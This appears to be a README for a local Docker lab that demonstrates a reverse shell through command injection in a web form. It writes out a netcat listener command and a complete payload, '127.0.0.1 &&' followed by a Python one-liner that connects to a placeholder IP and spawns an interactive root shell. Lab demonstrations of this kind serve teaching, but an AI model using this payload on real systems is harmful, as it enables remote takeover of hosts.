## What is this?
A quick demo of a reverse shell.

## How do I use it?

****Note: If you don't have Docker installed, you can install it [here](https://www.docker.com/).**

1. Install dependancies: ```npm i```

2. Build the docker image: ```npm run docker:build```

3. Run the docker image: ```npm run docker:start```

4. Go [here](http://localhost:3000/) in your web browser.

5. Listen to port 9999 on your computer: ```nc -l 9999```

6. Put this in the input field on the webpage (change where it says "CHANGE ME" to your computer's IP): ```127.0.0.1 && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CHANGE ME",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

7. Press submit in the webpage and check your terminal when you entered the command in step 5. 
    - You can type ```whoami``` to check if it worked. You should see "root"
